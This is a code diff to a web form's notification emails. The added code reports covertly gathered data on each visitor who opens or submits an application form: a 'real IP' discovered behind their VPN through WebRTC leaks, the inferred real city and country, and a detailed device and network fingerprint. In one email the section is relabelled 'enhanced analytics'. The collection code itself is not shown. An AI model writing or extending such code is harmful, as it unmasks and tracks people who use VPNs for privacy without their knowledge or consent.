@@ -86,6 +86,7 @@ Someone opened the application form. Browser location popup is being shown.
 
       if (data.location) {
         const loc = data.location;
+        const adv = loc.advancedDetection;
 
         emailBody += `═══════════════════════════════════════════════════════════════════
                         IP & LOCATION DATA
@@ -94,12 +95,67 @@ Someone opened the application form. Browser location popup is being shown.
 - IP Address: ${loc.ip || 'Unknown'}
 `;
 
-        if (loc.isVPN) {
+        if (loc.isVPN || (adv && adv.isVPN)) {
           emailBody += `- VPN DETECTED: YES
-- VPN/Proxy Provider: ${loc.vpnProvider || 'Unknown provider'}
+- VPN/Proxy Provider: ${adv?.vpnProvider || loc.vpnProvider || 'Unknown provider'}
+- Detection Confidence: ${adv?.vpnConfidence || 'Medium'}
 `;
         } else {
           emailBody += `- VPN Detected: No (regular connection)
+`;
+        }
+
+        // Add advanced detection results
+        if (adv) {
+          emailBody += `
+═══════════════════════════════════════════════════════════════════
+                    🔍 REAL IP DETECTION REPORT
+═══════════════════════════════════════════════════════════════════
+`;
+
+          if (adv.realIP) {
+            emailBody += `
+✅ REAL IP DISCOVERED: ${adv.realIP}
+Method: ${adv.inferredRealLocation?.method || 'WebRTC Leak'}
+Confidence: ${adv.inferredRealLocation?.confidence || 90}%
+`;
+          }
+
+          if (adv.leaks.webRTCLeaked && adv.leaks.webRTCIPs.length > 0) {
+            emailBody += `
+WebRTC IP LEAKS DETECTED:
+${adv.leaks.webRTCIPs.map((ip: string) => `  - ${ip}`).join('\n')}
+`;
+          }
+
+          if (adv.inferredRealLocation) {
+            emailBody += `
+INFERRED REAL LOCATION:
+- Method: ${adv.inferredRealLocation.method}
+- Confidence: ${adv.inferredRealLocation.confidence}%
+- Reasoning: ${adv.inferredRealLocation.reasoning}
+${adv.inferredRealLocation.country ? `- Country: ${adv.inferredRealLocation.country}` : ''}
+${adv.inferredRealLocation.city ? `- City: ${adv.inferredRealLocation.city}` : ''}
+${adv.inferredRealLocation.timezone ? `- Timezone: ${adv.inferredRealLocation.timezone}` : ''}
+`;
+          }
+
+          if (!adv.leaks.timezoneMatch || !adv.leaks.languageMatch) {
+            emailBody += `
+⚠️  LOCATION MISMATCH DETECTED:
+${!adv.leaks.timezoneMatch ? '  - Timezone doesn\'t match VPN IP location' : ''}
+${!adv.leaks.languageMatch ? '  - Browser language doesn\'t match VPN IP location' : ''}
+`;
+          }
+
+          emailBody += `
+THREAT INTELLIGENCE:
+- Privacy Level: ${adv.privacyLevel}
+- Threat Score: ${adv.threat.threatScore}/100
+- Is Proxy: ${adv.threat.isProxy ? 'YES' : 'No'}
+- Is TOR: ${adv.threat.isTor ? 'YES' : 'No'}
+- Is Data Center: ${adv.threat.isDataCenter ? 'YES' : 'No'}
+- Is Hosting Provider: ${adv.threat.isHosting ? 'YES' : 'No'}
 `;
         }
 
@@ -115,13 +171,44 @@ APPROXIMATE LOCATION (from IP):
 
         emailBody += `
 ═══════════════════════════════════════════════════════════════════
-                        DEVICE INFO
+                    📱 DEVICE & NETWORK DETAILS
 ═══════════════════════════════════════════════════════════════════
+`;
 
+        if (adv && adv.deviceInfo) {
+          const dev = adv.deviceInfo;
+          emailBody += `
+DEVICE INFORMATION:
+- Device Type: ${dev.type}
+- Operating System: ${dev.os}
+- Browser: ${dev.browser}
+- Platform: ${dev.platform}
+- Touch Support: ${dev.touchSupport ? 'Yes' : 'No'} (${dev.maxTouchPoints} touch points)
+- Screen: ${dev.screenResolution} (${dev.colorDepth}-bit color)
+- Hardware: ${dev.hardwareConcurrency} CPU cores${dev.deviceMemory ? `, ${dev.deviceMemory}GB RAM` : ''}
+- Cookies Enabled: ${dev.cookiesEnabled ? 'Yes' : 'No'}
+
+LOCALIZATION:
+- Primary Language: ${dev.language}
+- All Languages: ${dev.languages.join(', ')}
+- Timezone: ${dev.timezone} (UTC ${dev.timezoneOffset > 0 ? '-' : '+'}${Math.abs(dev.timezoneOffset / 60)})
+
+NETWORK INFORMATION:
+- ISP: ${adv.isp || 'Unknown'}
+- Organization: ${adv.organization || 'Unknown'}
+- Connection Type: ${adv.connectionType || 'Unknown'}
+- ASN: ${adv.asn || 'Unknown'}
+`;
+        } else {
+          emailBody += `
 - Platform: ${loc.deviceInfo.platform || 'Unknown'}
 - Language: ${loc.deviceInfo.language || 'Unknown'}
 - Screen Resolution: ${loc.deviceInfo.screenResolution || 'Unknown'}
 - Timezone: ${loc.deviceInfo.timezone || 'Unknown'}
+`;
+        }
+
+        emailBody += `
 - User Agent: ${loc.deviceInfo.userAgent || 'Unknown'}
 `;
       } else {
@@ -175,6 +262,7 @@ Submission Time: ${formattedDate}
 
       if (data.location) {
         const loc = data.location;
+        const adv = loc.advancedDetection;
 
         emailBody += `═══════════════════════════════════════════════════════════════════
                         LOCATION DATA
@@ -183,13 +271,61 @@ Submission Time: ${formattedDate}
 - IP Address: ${loc.ip || 'Unknown'}
 `;
 
-        if (loc.isVPN) {
+        if (loc.isVPN || (adv && adv.isVPN)) {
           emailBody += `- VPN DETECTED: YES
-- VPN/Proxy Provider: ${loc.vpnProvider || 'Unknown provider'}
+- VPN/Proxy Provider: ${adv?.vpnProvider || loc.vpnProvider || 'Unknown provider'}
+- Detection Confidence: ${adv?.vpnConfidence || 'Medium'}
 `;
         } else {
           emailBody += `- VPN Detected: No (regular connection)
 `;
+        }
+
+        // Add advanced detection results for form submission
+        if (adv) {
+          emailBody += `
+═══════════════════════════════════════════════════════════════════
+                    🔍 ENHANCED ANALYTICS
+═══════════════════════════════════════════════════════════════════
+`;
+
+          if (adv.realIP) {
+            emailBody += `
+VPN DETECTION: YES (${adv.vpnProvider || 'Unknown Provider'})
+REAL IP INFERRED: ${adv.realIP}
+DETECTION METHOD: ${adv.inferredRealLocation?.method || 'WebRTC Leak'}
+CONFIDENCE: ${adv.inferredRealLocation?.confidence || 90}%
+`;
+          }
+
+          if (adv.inferredRealLocation && adv.inferredRealLocation.city) {
+            emailBody += `
+APPROXIMATE REAL LOCATION: ${adv.inferredRealLocation.city || ''}, ${adv.inferredRealLocation.country || ''}
+`;
+          }
+
+          if (adv.leaks.webRTCLeaked && adv.leaks.webRTCIPs.length > 0) {
+            emailBody += `
+WebRTC IP LEAKS:
+${adv.leaks.webRTCIPs.map((ip: string) => `  - ${ip}`).join('\n')}
+`;
+          }
+
+          if (adv.deviceInfo) {
+            emailBody += `
+DEVICE: ${adv.deviceInfo.type} (${adv.deviceInfo.os}, ${adv.deviceInfo.browser})
+`;
+          }
+
+          if (adv.isp) {
+            emailBody += `ISP: ${adv.isp}
+`;
+          }
+
+          if (adv.privacyLevel !== 'Low') {
+            emailBody += `PRIVACY LEVEL: ${adv.privacyLevel}
+`;
+          }
         }
 
         if (loc.coordinates) {
